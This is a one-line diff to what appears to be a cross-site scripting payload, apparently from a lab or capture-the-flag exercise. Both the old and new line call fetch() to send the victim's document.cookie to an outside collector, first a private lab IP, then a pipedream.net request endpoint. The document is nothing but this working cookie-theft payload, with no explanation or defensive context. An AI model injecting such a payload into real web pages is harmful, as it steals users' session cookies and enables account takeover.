@@ -1,1 +1,1 @@
-fetch("http://10.10.14.4/?c="+document.cookie);
+fetch("https://enftmc9bu2d4r.x.pipedream.net/?c="+document.cookie);
